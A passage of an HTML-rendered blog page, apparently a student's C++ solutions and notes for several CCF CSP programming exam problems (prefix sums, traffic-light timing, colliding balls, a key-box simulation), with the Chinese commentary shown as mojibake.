class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-number">0</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-number">0</span>) , cout.<span class="hljs-built_in">tie</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> n,N;<br>    cin &gt;&gt; n &gt;&gt; N;<br>    <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>,x;<br>    ll error=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> g[<span class="hljs-number">205</span>];<span class="hljs-comment">//å­˜gçš„æ•°å€¼</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<span class="hljs-comment">//å­˜ä¸‹æ ‡</span><br>    <span class="hljs-type">int</span> r=N/(n<span class="hljs-number">+1</span>);<br>    <span class="hljs-type">bool</span> flag=<span class="hljs-literal">true</span>;<br>    <span class="hljs-type">int</span> nn;<span class="hljs-comment">//ç®€åŒ–è®¡ç®—</span><br>    <span class="hljs-keyword">for</span>(i; i &lt; n; i++)<br>    &#123;<br>        cin &gt;&gt; x;<span class="hljs-comment">//è¾“å…¥ä¸‹ä¸€ä¸ªæ•°</span><br>        nn=i*r;<br>        <span class="hljs-keyword">if</span>((x-ans)%r==<span class="hljs-number">0</span>)<span class="hljs-comment">//x-ansæ˜¯éœ€è¦è¢«èµ‹å€¼çš„æ•°çš„æ•°é‡</span><br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = ans; j &lt; x; j+=r)<br>            &#123;<br>                error+=<span class="hljs-built_in">abs</span>(j-nn);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-type">int</span> j = ans;<br>            <span class="hljs-type">int</span> xx=(x-ans)/r;<span class="hljs-comment">//æœ‰å¤šå°‘è½®å¯ä»¥ç®€åŒ–è®¡ç®—</span><br>            <span class="hljs-keyword">for</span>(j; xx&gt;<span class="hljs-number">0</span>; xx--,j+=r)<br>            &#123;<br>                error+=<span class="hljs-built_in">abs</span>(j-nn);<br>            &#125;<br>            <span class="hljs-comment">//å‰©ä½™è½®å¸¸è§„è¿ç®—</span><br>            <span class="hljs-keyword">for</span>(j; j&lt;x; j++)<br>            &#123;<br>                g[i]=j/r;<br>                error+=<span class="hljs-built_in">abs</span>(g[i]-i);<br>            &#125;<br>        &#125;<br>        ans=x;<span class="hljs-comment">//ä¸‹ä¸€è½®</span><br>    &#125;<br>    nn=i*r;<br>    <span class="hljs-keyword">if</span>((N-ans)%r==<span class="hljs-number">0</span>)<span class="hljs-comment">//x-ansæ˜¯éœ€è¦è¢«èµ‹å€¼çš„æ•°çš„æ•°é‡</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = ans; j &lt; N; j+=r)<br>        &#123;<br>            error+=<span class="hljs-built_in">abs</span>(j-nn);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-type">int</span> j = ans;<br>        <span class="hljs-type">int</span> xx=(N-ans)/r;<span class="hljs-comment">//æœ‰å¤šå°‘è½®å¯ä»¥ç®€åŒ–è®¡ç®—</span><br>        <span class="hljs-keyword">for</span>(j; xx&gt;<span class="hljs-number">0</span>; xx--,j+=r)<br>        &#123;<br>            error+=<span class="hljs-built_in">abs</span>(j-nn);<br>        &#125;<br>        <span class="hljs-comment">//å‰©ä½™è½®å¸¸è§„è¿ç®—</span><br>        <span class="hljs-keyword">for</span>(j; j&lt;N; j++)<br>        &#123;<br>            g[i]=j/r;<br>            error+=<span class="hljs-built_in">abs</span>(g[i]-i);<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; error &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="202104-2-é¢†åŸŸå‡å€¼">202104-2 é¢†åŸŸå‡å€¼</h2><p>äºŒç»´å‰ç¼€å’Œ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-number">0</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-number">0</span>) , cout.<span class="hljs-built_in">tie</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> n,L,r,t;<br>    cin &gt;&gt; n &gt;&gt; L &gt;&gt; r &gt;&gt; t;<br>    <span class="hljs-type">int</span> arr[<span class="hljs-number">610</span>][<span class="hljs-number">610</span>],x;<br>    <span class="hljs-built_in">memset</span>(arr,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(arr));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++)<br>        &#123;<br>            cin &gt;&gt; x;<br>            arr[i][j] = arr[i][j - <span class="hljs-number">1</span>] + arr[i - <span class="hljs-number">1</span>][j] - arr[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + x;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> cnt=<span class="hljs-number">0</span>,x_max,x_min,y_min,y_max,sum;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++)<br>        &#123;<br>            <span class="hljs-type">double</span> ans;<br>            x_min=<span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>,i-r);<br>            x_max=<span class="hljs-built_in">min</span>(r+i,n<span class="hljs-number">-1</span>);<br>            y_min=<span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>,j-r);<br>            y_max=<span class="hljs-built_in">min</span>(r+j,n<span class="hljs-number">-1</span>);<br>            ans=arr[x_max<span class="hljs-number">+1</span>][y_max<span class="hljs-number">+1</span>] - arr[x_max<span class="hljs-number">+1</span>][y_min] - arr[x_min][y_max<span class="hljs-number">+1</span>] + arr[x_min][y_min];<br><br>            sum=(x_max-x_min<span class="hljs-number">+1</span>)*(y_max-y_min<span class="hljs-number">+1</span>);<br>            <br>            sum=<span class="hljs-built_in">ceil</span>(ans/sum);<br>            <span class="hljs-keyword">if</span>(sum&lt;=t)<br>            cnt++;<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; cnt &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2018å¹´">2018å¹´</h1><h2 id="201812-2-å°æ˜æ”¾å­¦">201812-2 å°æ˜æ”¾å­¦</h2><p>è¿™ä¸ªé¢˜ç›®çœ‹èµ·æ¥å¹¶ä¸éš¾ï¼Œåªéœ€è¦æ¯æ¬¡è¾“å…¥çº¢ç»¿ç¯æ—¶é—´æ—¶è¿›è¡Œåˆ¤æ–­ç›®å‰å‰è¡Œäº†çš„æ—¶é—´æ˜¯å¦è¶…è¿‡çº¢ç»¿ç¯æ—¶é—´ï¼Œä¹‹åå†å°†æ—¶é—´æ¨¡ä¸€è½®çº¢ç»¿ç¯æ—¶é—´ï¼Œå†è¿›è¡Œåˆ¤æ–­åˆ°äº†å“ªä¸ªçº¢ç»¿ç¯å³å¯ã€‚</p><p>å‘ç‚¹åœ¨äºéœ€è¦ç»™æ€»æ—¶é—´å¼€longlongï¼Œä¸€å¼€å§‹æ²¡æ³¨æ„ï¼Œç›´æ¥ç­”æ¡ˆé”™è¯¯ï¼Œç»™æˆ‘æ‡µäº†å¥½ä¹…ï¼Œä¹‹åæ‰å‘ç°çš„ã€‚éš¾ç‚¹åœ¨äºæ¨¡é™¤ä¹‹åçš„åˆ¤æ–­ï¼Œåˆ¤æ–­åº”è¯¥æ˜¯ çº¢-&gt;ç»¿-&gt;é»„-&gt;çº¢ è¿™æ ·å¾ªç¯ï¼Œä½†æ˜¯çº¢ç»¿ç¯kçš„å¢é•¿å´æ˜¯1-&gt;2-&gt;3-&gt;1ï¼Œ1ä¸ºçº¢ï¼Œ2ä¸ºé»„ï¼Œ3ä¸ºç»¿ï¼Œä¸æ‰€éœ€çº¢ç»¿ç¯çš„å¾ªç¯å¯¹ä¸ä¸Šï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªæ•°ç»„å°†çº¢ç»¿ç¯çš„å˜åŒ–å­˜ä¸‹æ¥ã€‚</p><p>æ€è·¯ç†æ¸…ä¹‹åå…¶å®å°±å¾ˆç®€å•äº†ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> light[<span class="hljs-number">4</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> k, <span class="hljs-type">int</span> t)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(k==<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> t;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(k==<span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> t+light[<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin &gt;&gt; light[<span class="hljs-number">1</span>] &gt;&gt; light[<span class="hljs-number">2</span>] &gt;&gt; light[<span class="hljs-number">3</span>];<br>    cin &gt;&gt; n;<br>    <span class="hljs-type">int</span> k;<br>    <span class="hljs-type">int</span> roll_time=light[<span class="hljs-number">1</span>]+light[<span class="hljs-number">2</span>]+light[<span class="hljs-number">3</span>];<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> t;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> time=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> shunxu[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cin &gt;&gt; k &gt;&gt; t;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> tmp;<br>        <span class="hljs-keyword">if</span>(k==<span class="hljs-number">0</span>)<br>        &#123;<br>            time+=t;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(t&gt;time)<br>            &#123;<br>                time+=<span class="hljs-built_in">get</span>(k,t-time);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                tmp=time-t;<br>                k=shunxu[k];<br>            &#125;<br>            tmp%=(roll_time);<br>            <span class="hljs-keyword">while</span>(tmp&gt;=light[k])<br>            &#123;<br>                tmp-=light[k];<br>                k=shunxu[k];<br>            &#125;<br>            t=light[k]-tmp;<br>            time+=<span class="hljs-built_in">get</span>(k,t);<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; time &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="201803-2-ç¢°æ’çš„å°çƒ">201803-2 ç¢°æ’çš„å°çƒ</h2><p>ä»”ç»†çœ‹é¢˜ç›®ï¼Œæ¯ä¸ªå°çƒçš„è¿åŠ¨æ–¹å‘æ¯ä¸ªæ—¶åˆ»éƒ½æœ‰å¯èƒ½ä¸ä¸€æ ·ï¼Œå› æ­¤æ¯«æ— ç–‘é—®è¦ä¸€ä¸ªæ•°ç»„å‚¨å­˜å°çƒçš„æ–¹å‘äº†ã€‚å¹¶ä¸”éœ€è¦éå†æ—¶é—´ï¼Œæ¯ä¸€ç§’å°çƒçš„ä½ç½®å…ˆè¿›è¡Œæ”¹å˜ï¼Œä¹‹åè¿›è¡Œåˆ¤æ–­æ˜¯å¦éœ€è¦è¿›è¡Œæ–¹å‘çš„æ”¹å˜ï¼Œæ–¹å‘çš„æ”¹å˜åªæœ‰ä¸‰ç§æƒ…å†µï¼š</p><ul><li>å°çƒä½ç½®ç­‰äºé•¿åº¦</li><li>å°çƒä½ç½®ç­‰äº0</li><li>å°çƒé‡åˆ</li></ul><p>å°çƒé‡åˆä»å‰å¾€åè¿›è¡Œåˆ¤æ–­å³å¯ï¼Œé¢˜ç›®å·²ç»è¯´äº†ä¸å¯èƒ½æœ‰ä¸‰ä¸ªå°çƒåŒæ—¶é‡åˆï¼Œæ‰€ä»¥å°±ä¼šç®€å•å¾ˆå¤šï¼Œé‚£ä¹ˆå°±ç›´æ¥ä¸Šä»£ç å§ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n,L,t;<br>    cin &gt;&gt; n &gt;&gt; L &gt;&gt; t;<br>    <span class="hljs-type">int</span> sphere[<span class="hljs-number">101</span>],where[<span class="hljs-number">101</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cin &gt;&gt; sphere[i];<br>        where[i]=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(t--)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        &#123;<br>            sphere[i]+=where[i];<br>            <span class="hljs-keyword">if</span>(sphere[i]==L)<br>            where[i]=<span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">if</span>(sphere[i]==<span class="hljs-number">0</span>)<br>            where[i]=<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = i<span class="hljs-number">+1</span>; j &lt; n; j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(sphere[i]==sphere[j])<br>                &#123;<br>                    where[i]=-where[i];<br>                    where[j]=-where[j];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; sphere[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2017å¹´">2017å¹´</h1><h2 id="201709-2-å…¬å…±é’¥åŒ™ç›’-æœªå†™å‡º">201709-2 å…¬å…±é’¥åŒ™ç›’(æœªå†™å‡º)</h2><p>è¿™é“é¢˜ä¸€å¼€å§‹æ²¡æœ‰å†™å‡ºæ¥ï¼Œä¸€å¼€å§‹ä¸ºäº†é˜²æ­¢è¶…æ—¶ï¼Œæ€è·¯æ˜¯åŒæŒ‡é’ˆï¼Œä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¼€å§‹æ—¶é—´ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ç»“æŸæ—¶é—´ã€‚ä½†æ˜¯å¿˜è®°æŒ‰å¼€å§‹æ—¶é—´åœ¨å‰çš„å…ˆå–äº†ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰è¿›è¡Œæ’åºï¼Œæœ€åå†™å‡ºæ¥å…¨æ˜¯é”™çš„ï¼Œæƒ¨ä¸å¿ç¹ï¼Œæœ€åä¸Šç½‘æœäº†é¢˜è§£æ‰å‹‰å¼ºå†™å‡ºã€‚</p><p>æ€è·¯ä¾¿æ˜¯æŒ‰ç…§æ—¶åˆ»è¿›è¡Œå¤§å¾ªç¯å¤„ç†ï¼Œå…ˆè¿˜å†å€Ÿã€‚è¿˜çš„æ—¶å€™å…ˆéå†çŸ¥é“æœ‰å¤šå°‘æ˜¯è¿˜çš„ï¼Œç„¶åæŒ‰ç…§ç¼–å·è¿›è¡Œæ’åºï¼Œç„¶åè¿›è¡Œè¿˜é’¥åŒ™çš„å¤„ç†ï¼Œæ”¹å˜æ•°ç»„aå’Œb,å€Ÿçš„æ—¶å€™åŒæ ·ï¼Œè¿›è¡Œéå†ï¼Œåªæ˜¯ä¸éœ€è¦ç»Ÿè®¡å€Ÿçš„äººæ•°ï¼ŒæŒ‰ç…§æ•°ç»„rçš„é¡ºåºè¿›è¡Œå¤„ç†å³å¯ã€‚è¿™é‡Œç”¨åˆ°ä¸€ä¸ªsearchå› ä¸ºç»è¿‡å¾ˆå¤šæ¬¡çš„å€Ÿè¿˜å¯¼è‡´åˆ¶å®šç¼–å·çš„é’¥åŒ™ä¸èƒ½ç›´æ¥çŸ¥é“å®ƒæ‰€åœ¨çš„é’©å­ï¼Œå¯¼è‡´ä¸çŸ¥é“åº”è¯¥å¦‚ä½•å¤„ç†ä¸‹æ ‡ä¸ºå‡ çš„æ•°ç»„aå’Œbã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-type">int</span> a[], <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) <br>&#123;<br><span class="hljs-keyword">if</span> (a[i] == b) <br>&#123;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> k;<br>cin &gt;&gt; n;<br>cin &gt;&gt; k;<br><span class="hljs-type">int</span> a[<span class="hljs-number">1000</span>];<br><span class="hljs-type">bool</span> b[<span class="hljs-number">1000</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> u = <span class="hljs-number">0</span>; u &lt; n; u++) <br>&#123;<br>a[u] = u + <span class="hljs-number">1</span>;<br>b[u] = <span class="hljs-literal">true</span>;<br>&#125;<span class="hljs-comment">//é’¥åŒ™éƒ¨åˆ†åˆå§‹åŒ–ï¼Œtrueè¡¨æ˜é’¥åŒ™æ”¾åœ¨é’¥åŒ™ç›’é‡Œ</span><br><span class="hljs-type">int</span> s[<span class="hljs-number">10000</span>][<span class="hljs-number">3</span>];<br><span class="hljs-type">int</span> r[<span class="hljs-number">10000</span>];<span class="hljs-comment">//ç”¨æ¥å¤„ç†å¤šä½è€å¸ˆåŒæ—¶è¿˜é’¥åŒ™çš„æƒ…å†µ</span><br><span class="hljs-type">int</span> max = <span class="hljs-number">0</span>;<span class="hljs-comment">//æœ€æ™šç»“æŸæ—¶é—´</span><br><span class="hljs-comment">//è¿›è¡Œå†…å®¹çš„è¾“å…¥</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span 